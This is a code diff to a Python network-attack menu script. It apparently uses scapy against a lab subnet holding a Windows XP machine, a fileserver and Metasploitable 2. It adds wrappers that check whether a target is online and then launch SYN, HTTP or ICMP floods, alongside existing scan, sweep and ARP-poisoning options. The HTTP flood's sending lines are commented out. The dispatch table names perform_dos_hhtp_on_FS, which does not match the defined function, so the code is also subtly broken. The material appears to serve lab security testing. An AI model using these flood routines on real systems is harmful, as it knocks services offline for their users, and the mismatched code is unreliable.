@@ -7,9 +7,9 @@ def attack_to_perform(number):
     switch = {
         1: perform_reconnaissance_TCP_ACK,  # first recon attack
         2: perform_reconnaissance_UDP_SCAN,  # second recon attack
-        3: perform_dos,  # first dos attack
-        4: perform_dos,  # second dos attack
-        5: perform_dos,  # third dos attack
+        3: perform_dos_syn_on_XP,  # first dos attack
+        4: perform_dos_hhtp_on_FS,  # second dos attack
+        5: perform_dos_icmp_on_XP,  # third dos attack
         6: perform_ftp_attack,  # ftp attack (ok?)
         7: perform_sweep,  # ip address sweep (ok)
         8: perform_port_scan_TCP,  # port scan (ok)
@@ -18,9 +18,10 @@ def attack_to_perform(number):
         11: perform_syn_flood_attack,  # syn flood attack (?)
         12: perform_icmp_flood_attack,  # icmp flood attack (?)
         13: perform_udp_flood_attack,  # udp flood attack (?)
-        14: perform_drop_communication,  # drop communication (not working)
-        15: perform_arp_poisoning,  # arp poisoning (to implement)
-        16: perform_special_attack,  # special attack
+        14: perform_http_flood_attack,  # http flood attack (?)
+        15: perform_drop_communication,  # drop communication (not working)
+        16: perform_arp_poisoning,  # arp poisoning (to implement)
+        17: perform_special_attack,  # special attack
     }
 
     if number in switch:
@@ -33,9 +34,9 @@ def print_attack_menu():
     print("Standard Attacks: -----------------------------------")
     print("(1) Reconnaissance: TCP ACK FLAG Scan on network 192.168.200.x ")
     print("(2) Reconnaissance: UDP Scan on network 192.168.200.x")
-    print("(3) Denial of Service Attack on network 192...")
-    print("(4) Denial of Service Attack on network 192...")
-    print("(5) Denial of Service Attack on network 192...")
+    print("(3) Denial of Service: SYN FLOOD on Windows XP")
+    print("(4) Denial of Service: HTTP FLOOD on Fileserver")
+    print("(5) Denial of Service: ICMP FLOOD on Windows XP")
     print("(6) FTP Attack on Metasploitable 2")
     print("Custom Attacks: -------------------------------------")
     print("(7) IP Address Sweep")
@@ -71,7 +72,7 @@ def perform_reconnaissance_TCP_ACK(ip_addr="192.168.200."):
     print("Performing TCP ACK scan on ", dst_ip, " port ", dst_port, " ...")
 
     response = sr1(
-        IP(dst=dst_ip) / TCP(dport=dst_port, flags="A"), timeout=10, verbose=False
+        IP(dst=dst_ip) / TCP(dport=dst_port, flags="A"), timeout=1, verbose=False
     )
 
     if response is None:
@@ -138,13 +139,43 @@ def udp_scan(dst_ip, dst_port, dst_timeout):
             return "Filtered"
 
 
-# Code to perform dos attack
-def perform_dos(ip_addr=None):
-    if not ip_addr:
-        # Get input from the user
-        ip_addr = input("Enter the IP address to Dos: ")
+# (3) Code to perform denial of service SYN FLOOD on Windows XP
+def perform_dos_syn_on_XP(ip_addr="192.168.200.40"):
+    packet = IP(dst=ip_addr) / ICMP()
+    reply = sr1(packet, timeout=0.1, verbose=0)
 
-    return "Dos performed on " + ip_addr
+    if reply is not None and ICMP in reply:
+        print(ip_addr, " Windows XP is online")
+        print("Performing SYN FLOOD attack on ", ip_addr, " ...")
+        return perform_syn_flood_attack(ip_addr)
+
+    return "Windows XP is unreachable"
+
+
+# (4) Code to perform denial of service HTTP FLOOD on Fileserver
+def perform_dos_http_on_fileserver(ip_addr="192.168.200.55"):
+    packet = IP(dst=ip_addr) / ICMP()
+    reply = sr1(packet, timeout=0.1, verbose=0)
+
+    if reply is not None and ICMP in reply:
+        print(ip_addr, " Fileserver is online")
+        print("Performing HTTP FLOOD attack on ", ip_addr, " ...")
+        return perform_http_flood_attack(ip_addr, 80)
+
+    return "Fileserver is unreachable"
+
+
+# (5) Code to perform denial of service ICMP FLOOD on Windows XP
+def perform_dos_icmp_on_XP(ip_addr="192.168.200.40"):
+    packet = IP(dst=ip_addr) / ICMP()
+    reply = sr1(packet, timeout=0.1, verbose=0)
+
+    if reply is not None and ICMP in reply:
+        print(ip_addr, " Windows XP is online")
+        print("Performing ICMP FLOOD attack on ", ip_addr, " ...")
+        return perform_icmp_flood_attack(ip_addr)
+
+    return "Windows XP is unreachable"
 
 
 # (6) Code to perform ftp attack
@@ -357,7 +388,24 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
     return "UDP flood attack performed on " + ip_addr + " to port " + port
 
 
-# (14) Code to perform drop communication
+# (14) Code to perform http flood attack
+def perform_http_flood_attack(ip_addr=None, port=None):
+    if not ip_addr:
+        # Get input from the user
+        ip_addr = input("Enter the IP address to scan: ")
+
+    if not port:
+        # Get input from the user
+        port = input("Enter the port to attack: ")
+
+    # packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port)) / ("X" * RandByte())
+
+    # send(packet, inter=0.005, loop=1, verbose=0)
+
+    return "HTTP flood attack performed on " + ip_addr + " to port " + port
+
+
+# (15) Code to perform drop communication
 def perform_drop_communication(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -398,7 +446,7 @@ def perform_drop_communication(ip_addr=None):
     return "Drop communication performed on IP address: {}".format(ip_addr)
 
 
-# (15) Code to perform ARP poisoning
+# (16) Code to perform ARP poisoning
 def perform_arp_poisoning(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -407,7 +455,7 @@ def perform_arp_poisoning(ip_addr=None):
     return "ARP poisoning performed on " + ip_addr
 
 
-# (16) Code to perform Special attack
+# (17) Code to perform Special attack
 def perform_special_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
